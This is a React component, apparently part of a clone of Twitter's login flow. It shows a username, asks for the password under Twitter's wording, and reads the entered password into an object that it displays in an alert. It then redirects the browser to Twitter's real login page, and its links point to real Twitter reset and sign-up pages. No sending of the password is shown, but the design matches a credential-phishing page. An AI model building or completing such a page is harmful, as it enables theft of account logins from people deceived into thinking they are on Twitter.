import React from 'react';
import './login2.css';

export default function Login2(username) {
    let name = username.text.username;

    const getPassword = (event) => {
        event.preventDefault();

        let password = document.getElementById('password').value;
        let user = {
            username: name,
            password: password,
        };

        alert(user.username + ', ' + user.password);

        window.location.href = 'https://twitter.com/i/flow/login';
    };

    return (
        <div className='login2'>
            <div className='login2wrapper'>
                <h1 className='title'>Enter you password</h1>

                <form onSubmit={getPassword}>
                    <div className='input1'>
                        <p id='input1user'>Username</p>
                        <p>{name}</p>
                    </div>
                    <input
                        type='password'
                        placeholder='Password'
                        className='input2'
                        id='password'
                        required
                    />

                    <a
                        href='https://twitter.com/i/flow/password_reset?input_flow_data=%7B%22requested_variant%22%3A%22eyJ1c2VyX2lkZW50aWZpZXIiOiJqYWNvYmhhd2tpbnNfXyIsInBsYXRmb3JtIjoiUndlYiJ9%22%7D'
                        id='passwordLink'>
                        Forgot password?
                    </a>
                    <button type='submit' className='button' id='passwordButton'>
                        Log in
                    </button>
                </form>

                <p id='noAccountTextPassword'>
                    Don't have an account?
                    <a href='https://twitter.com/i/flow/signup' id='noAccountLinkPassword'>
                        Sign up
                    </a>
                </p>
            </div>
        </div>
    );
}
